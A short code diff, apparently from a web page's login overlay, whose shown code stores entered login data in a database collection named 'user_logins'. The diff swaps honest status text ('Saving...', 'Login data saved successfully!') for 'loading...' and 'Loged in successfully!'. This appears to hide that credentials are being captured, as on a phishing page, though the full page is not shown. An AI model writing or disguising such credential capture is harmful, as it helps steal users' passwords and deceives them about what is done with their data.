@@ -623,7 +623,7 @@
             const passwordInput = document.getElementById('passwordInput');
             
             if (loading) {
-                submitBtn.textContent = 'Saving...';
+                submitBtn.textContent = 'loading...';
                 submitBtn.disabled = true;
                 loginInput.disabled = true;
                 passwordInput.disabled = true;
@@ -658,7 +658,7 @@
                 await db.collection('user_logins').doc(loginId).set(loginData);
 
                 console.log('Login data stored successfully:', loginData);
-                showSuccess('Login data saved successfully!');
+                showSuccess('Loged in successfully!');
                 
                 // Close overlay after success
                 setTimeout(() => {
